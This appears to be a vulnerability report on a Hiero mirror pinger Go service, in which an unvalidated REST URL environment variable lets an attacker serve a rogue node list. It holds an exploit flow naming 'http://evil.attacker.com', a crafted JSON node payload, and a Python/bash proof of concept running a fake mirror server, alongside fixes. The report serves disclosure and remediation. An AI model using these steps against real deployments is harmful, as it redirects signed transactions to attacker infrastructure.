### Title
Unvalidated `HIERO_MIRROR_PINGER_REST` URL Enables Full Network Partition via Attacker-Controlled Node List

### Summary
When `HIERO_MIRROR_PINGER_NETWORK` is set to `other`, `newClient()` unconditionally calls `buildNetworkFromMirrorNodes()` with the raw `HIERO_MIRROR_PINGER_REST` value as the base URL. There is no allowlist, scheme enforcement, TLS requirement, or cryptographic verification of the returned node list. An attacker who can influence these two environment variables — for example via a Kubernetes ConfigMap/Secret misconfiguration, insufficient RBAC, or a CI/CD pipeline compromise — can redirect the pinger to fetch a crafted node list from an attacker-controlled server, causing all subsequent Hiero transactions to be submitted to attacker-controlled gRPC endpoints instead of the legitimate network.

### Finding Description
**Code path:**

`pinger/config.go` line 133–135 — the only guard for `network=other` is that `mirrorRest` is non-empty: [1](#0-0) 

No scheme validation (`http://` vs `https://`), no hostname allowlist, and no TLS enforcement are applied to `cfg.mirrorRest`.

`pinger/sdk_client.go` lines 17–22 — when `cfg.network == "other"`, `buildNetworkFromMirrorNodes()` is called with the raw, unvalidated URL: [2](#0-1) 

`pinger/mirror_node_client.go` lines 37–44 — the URL is constructed by simple string concatenation from the attacker-controlled base: [3](#0-2) 

`pinger/mirror_node_client.go` lines 79–98 — a plain `http.Client` (no TLS pinning) issues a GET to the attacker URL and blindly JSON-decodes the response body: [4](#0-3) 

`pinger/mirror_node_client.go` lines 100–124 — the decoded node entries are used without any validation of account IDs or endpoint addresses against known-legitimate values: [5](#0-4) 

**Root cause:** The design assumes `mirrorRest` is always operator-supplied and trustworthy. There is no defense-in-depth: no URL scheme enforcement, no hostname allowlist, no TLS certificate verification requirement, and no cryptographic signature over the returned node list.

**Exploit flow:**
1. Attacker sets `HIERO_MIRROR_PINGER_NETWORK=other` and `HIERO_MIRROR_PINGER_REST=http://evil.attacker.com`.
2. `loadConfig()` passes validation (non-empty `mirrorRest` satisfies the only check).
3. `newClient()` enters the `"other"` branch and calls `buildNetworkFromMirrorNodes()`.
4. `fetchMirrorNodeNetwork()` issues `GET http://evil.attacker.com/api/v1/network/nodes`.
5. Attacker's server returns a crafted JSON payload, e.g.:
   ```json
   {"nodes":[{"node_account_id":"0.0.3","service_endpoints":[{"ip_address_v4":"1.2.3.4","port":50211}]}],"links":{"next":null}}
   ```
6. The pinger builds `hiero.ClientForNetwork({"1.2.3.4:50211": AccountID{0,0,3}})`.
7. Every subsequent `submitWithRetry` call sends signed Hiero transactions to the attacker's gRPC server.

### Impact Explanation
The pinger is completely partitioned from the legitimate Hiero network. All transactions — including operator-signed transfers — are delivered exclusively to attacker-controlled infrastructure. The attacker receives the full transaction payload (including the signed transaction bytes) for every tick interval. Depending on the attacker's goals this enables: silent transaction suppression (DoS of the monitoring function), replay or forwarding of signed transactions to the real network at a chosen time, and exfiltration of transaction metadata. Severity: **High**.

### Likelihood Explanation
The precondition — influencing two environment variables — is realistic in containerized deployments. Kubernetes ConfigMaps and Secrets that back env vars are frequently over-permissioned; a developer or CI/CD service account with `patch` on ConfigMaps in the same namespace can set these values without cluster-admin rights. The attack is repeatable: once the env vars are changed and the pod restarts (or is restarted by the attacker), the malicious configuration takes effect immediately and persists until corrected.

### Recommendation
1. **Enforce an allowlist of trusted `mirrorRest` hostnames** in `loadConfig()` when `network=other`, or at minimum require `https://` scheme.
2. **Validate returned node account IDs** against a known set of legitimate Hiero node account IDs before building the network map.
3. **Require TLS** for the `http.Client` used in `buildNetworkFromMirrorNodes()` and consider certificate pinning for the mirror REST endpoint.
4. **Restrict env-var/ConfigMap write permissions** via Kubernetes RBAC so that only the deployment pipeline can modify pinger configuration.

### Proof of Concept
```bash
# 1. Stand up a fake mirror REST server
python3 -c "
import http.server, json
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({'nodes':[{'node_account_id':'0.0.3',
            'service_endpoints':[{'ip_address_v4':'127.0.0.1','port':9999}]}],
            'links':{'next':None}}).encode()
        self.send_response(200); self.send_header('Content-Type','application/json')
        self.send_header('Content-Length',len(body)); self.end_headers()
        self.wfile.write(body)
http.server.HTTPServer(('0.0.0.0',8080),H).serve_forever()
" &

# 2. Launch pinger with attacker-controlled env vars
export HIERO_MIRROR_PINGER_NETWORK=other
export HIERO_MIRROR_PINGER_REST=http://127.0.0.1:8080
export HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.2
export HIERO_MIRROR_PINGER_OPERATOR_KEY=302e020100300506032b65700422042091132178e72057a1d7528025956fe39b0b847f200ab59b2fdd367017f3087137
export HIERO_MIRROR_PINGER_TO_ACCOUNT_ID=0.0.98

go run ./pinger/...
# Pinger starts, fetches node list from 127.0.0.1:8080, builds client pointing to 127.0.0.1:9999.
# All transactions are now directed to the attacker's endpoint.
```

### Citations

**File:** pinger/config.go (L133-135)
```go
	if cfg.network == "other" && strings.TrimSpace(cfg.mirrorRest) == "" {
		return cfg, fmt.Errorf("HIERO_MIRROR_PINGER_NETWORK=other requires HIERO_MIRROR_PINGER_REST")
	}
```

**File:** pinger/sdk_client.go (L17-22)
```go
	case "other":
		netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
		if err != nil {
			return nil, err
		}
		client = hiero.ClientForNetwork(netmap)
```

**File:** pinger/mirror_node_client.go (L37-44)
```go
	base := strings.TrimRight(strings.TrimSpace(cfg.mirrorRest), "/")

	var url string
	if strings.HasSuffix(base, "/api/v1") {
		url = base + "/network/nodes"
	} else {
		url = base + "/api/v1/network/nodes"
	}
```

**File:** pinger/mirror_node_client.go (L79-98)
```go
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, false, err
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, true, fmt.Errorf("GET %s failed: %w", url, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		retry := resp.StatusCode == http.StatusTooManyRequests || resp.StatusCode >= 500
		return nil, retry, fmt.Errorf("GET %s returned %s", url, resp.Status)
	}

	var payload nodesEnvelope
	if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
		return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
	}
```

**File:** pinger/mirror_node_client.go (L100-124)
```go
	network := make(map[string]hiero.AccountID)

	for _, n := range payload.Nodes {
		if n.NodeAccountID == "" {
			continue
		}

		nodeAccountId, err := hiero.AccountIDFromString(n.NodeAccountID)
		if err != nil {
			continue
		}

		// Use service_endpoints for node gRPC (what the SDK wants)
		for _, ep := range n.ServiceEndpoints {
			host := strings.TrimSpace(ep.DomainName)
			if host == "" {
				host = strings.TrimSpace(ep.IPAddressV4)
			}
			if host == "" || ep.Port == 0 {
				continue
			}

			addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
			network[addr] = nodeAccountId
		}
```
